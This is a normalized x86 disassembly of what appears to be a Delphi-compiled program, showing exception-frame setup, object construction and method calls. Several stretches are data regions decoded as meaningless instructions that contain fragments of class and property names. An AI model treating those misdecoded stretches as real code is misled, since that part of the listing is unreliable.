mov [ fs : eax ] edx
push sub_4741f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bdc8
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
sub al 0x1
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_4741f8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
call sub_42bdc0
xor eax eax
push ebp
push sub_47425b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bdc8
retn
sub_4742c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4742ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4742f4
retn
sub_4743f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_46e2d4
test al al
jne r-xdata
mov [ ebx + 0xf ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
jne r-xdata
mov eax ebx
call sub_403368
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
mov edx ebx
mov eax [ esi + 0x30 ]
call sub_418c78
pop esi
pop ebx
retn
sub_474434
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474459
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474460
retn
sub_474720
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474745
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47474c
retn
sub_474758
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47482c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0xc ]
call sub_404424
mov [ ebp - 0x10 ] eax
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_404768
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404424
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404684
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474833
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404188
retn
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404684
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46e3a8
mov esi eax
test esi esi
jg r-xdata
mov ecx ebx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_47483c
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47496d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_404424
mov [ ebp - 0x10 ] eax
mov ebx 0x1
lea edx [ ebp - 0xc ]
mov eax esi
call sub_408250
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
call sub_404424
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474974
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x14 ]
call sub_404164
lea eax [ ebp - 0xc ]
call sub_404164
retn
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ esi + eax ] 0x20
jbe r-xdata
inc [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_404768
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_404424
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404684
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_408250
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_46e3a8
mov esi eax
test esi esi
jg r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_408250
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_47497c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4749a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4749a8
retn
sub_4749b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4749f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418c64
cmp ebx [ eax + 0x8 ]
seta [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_418cc8
retn
sub_474a0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474a31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474a38
retn
sub_474bd4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421184
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ esi + 0x30 ] eax
mov [ esi + 0x38 ] 0x3
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_474c1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_474c8b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebx + 0x34 ]
call [ eax + 0x28 ]
mov esi eax
mov ecx 0x80000001
mov dl [ ebx + 0x38 ]
mov eax esi
call sub_46e300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474c92
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_474c9c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x30 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_474cd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474cf5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474cfc
retn
sub_474ef5
push [ eax ]
outsd
inc edi
add [ ecx ] dl
push esp
dec ecx
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
popad
outsb
insb
jb r-xdata
dec edi
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ebx
outsd
insd
insd
popad
outsb
dec eax
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
add [ eax ] eax
dec esi
inc edi
add [ eax ] cl
arpl [ ecx ] ax
or al 0x0
or ecx [ ecx + 0x64 ]
push esp
inc ebx
push eax
push ebx
jb r-xdata
sbb [ eax ] eax
add bh bh
sbb [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
add eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x4e
popad
insd
ror [ gs : ebp + 0x47 ] 0x1
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0000 ] al
insd
inc esp
insb
imul ebp [ ebp + 0x69 ] 0x94726574
adc [ eax ] al
adc [ eax ] al
add bh bh
adc [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
pop es
inc ebx
outsd
insd
insd
popad
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440a0002 ] al
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + eax + 0x10 ] si
inc eax
add [ ecx ] bl
add [ eax ] al
[ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] ch
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al 0x43
sub_475a50
add [ eax ] al
push esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52130018 ] al
jo r-xdata
inc [ ecx ]
add [ eax ] al
jns r-xdata
jmp [ eax + 0x1ff0000 ]
cmp al 0x5b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
inc ebx
outsd
insd
insd
popad
outsb
and ah bl
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or edx [ edx + 0x65 ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc edi
add [ eax + eax ] cl
jb r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
push esp
inc ebx
push eax
push ebx
jb r-xdata
lodsb [ esi ]
xor eax 0x35a00040
jb r-xdata
push edi
popad
imul esi [ esp + edx * 2 + 0x69 ] 0x4ae0656d
inc edi
add [ eax + 0x65 ] ch
inc edi
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x72 ] edx
popad
dec ebp
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 ] bh
inc edi
add [ eax + eax ] cl
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x4e644945 ] dl
outsd
inc ebp
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5409001b ] al
push 0x64616572
dec ebp
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + eax + 0x1ff00 ]
popad
je r-xdata
arpl [ ebp + 0x74 ] si
push ebx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 ] bl
or al 0x0
outsd
jb r-xdata
leave
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
push esp
push 0x64616572
push esp
imul ebp [ ebp + 0x65 ] 0x8b74756f
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
popad
push esp
arpl [ ecx + 0x66 ] bp
imul esp [ ebp + 0x64 ] 0x5c00c08b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ ebx + ebx * 2 + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0xc0047 ] bl
add [ eax ] al
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_475c1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ed0c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46fcb0
mov [ esi + 0x70 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_470940
mov [ esi + 0x9c ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_476a64
mov [ esi + 0x74 ] eax
mov [ esi + 0x78 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_475cf8
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
cmp [ esi + 0x88 ] 0x0
je r-xdata
lea eax [ esi + 0x70 ]
call sub_40d490
lea eax [ esi + 0xf4 ]
call sub_40d490
lea eax [ esi + 0x9c ]
call sub_40d490
lea eax [ esi + 0xac ]
call sub_40d490
lea eax [ esi + 0x94 ]
call sub_40d490
lea eax [ esi + 0x7c ]
call sub_40d490
lea eax [ esi + 0x74 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eda4
test bl bl
jle r-xdata
cmp [ esi + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
lea eax [ esi + 0x88 ]
call sub_40d490
sub_475dc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x7c ]
mov eax [ ebx + 0x9c ]
call sub_4709d8
mov edx [ ebx + 0x7c ]
mov eax [ esi + 0x68 ]
call sub_4738a8
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_475e3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_475f96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_419628
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475f9d
lea eax [ ebp - 0x10 ]
call sub_404164
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_404424
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_475da8
xor eax eax
push ebp
push sub_475f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_419628
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_475d88
retn
inc eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_419628
dec eax
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x20 ]
test al al
jne r-xdata
inc ebx
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_475fd0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx ebx
call sub_476aa8
mov esi eax
cmp [ esi + 0x19 ] 0x0
je r-xdata
sub_475fd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_47605c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xea ] 0x0
je r-xdata
mov eax [ ebx + 0xf4 ]
call sub_470838
test al al
je r-xdata
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov edx [ ebx + 0xf4 ]
mov eax [ esi + 0x68 ]
call sub_4738a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476063
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_476070
push ebx
mov ebx eax
mov eax ebx
call sub_4215d4
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x68 ] 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_476090
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x6c ]
jne r-xdata
cmp edi [ esi + 0x84 ]
jne r-xdata
mov eax esi
call sub_476448
xor eax eax
mov [ esi + 0x6c ] eax
jmp r-xdata
cmp edi [ esi + 0x88 ]
jne r-xdata
xor eax eax
mov [ esi + 0x84 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x88 ] eax
sub_4760e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x68 ] dl
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x68 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4763a0
xor eax eax
push ebp
push sub_4762e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_476448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x79 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_4749b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_419628
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x79 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_40d490
mov eax [ ebp - 0x4 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_476568
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_46fc50
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_419628
mov edi eax
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ed0c
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x81 ] 0x1
inc edi
xor esi esi
mov eax [ rw-data ]
push eax
push 0x4
mov ecx 0x4
mov edx 0xffff
mov eax ebx
call sub_46f5d0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_46fcec
mov ebx eax
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_46f4b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x1
je r-xdata
jmp r-xdata
mov eax ebx
call sub_46f70c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x90 ]
mov eax ebx
call sub_46f848
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_46fcec
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4765b8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx ebx
call sub_418bdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
inc esi
dec edi
jne r-xdata
jmp r-xdata
sub_47632c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov [ ebx + 0x6c ] esi
test esi esi
je r-xdata
lea eax [ ebx + 0x6c ]
call sub_40d490
mov [ ebx + 0x80 ] 0x0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_421254
sub_476360
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov [ ebx + 0x88 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_421254
mov [ ebx + 0x81 ] 0x0
lea eax [ ebx + 0x88 ]
call sub_40d490
sub_4763a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47642c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_418cc8
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4188a0
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x68 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_4210e0
mov eax ebx
call sub_403368
inc edi
dec esi
jne r-xdata
sub_476448
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476558
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47655f
lea eax [ ebp - 0x10 ]
call sub_404164
retn
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4764d0
push [ fs : eax ]
mov [ fs : eax ] esp
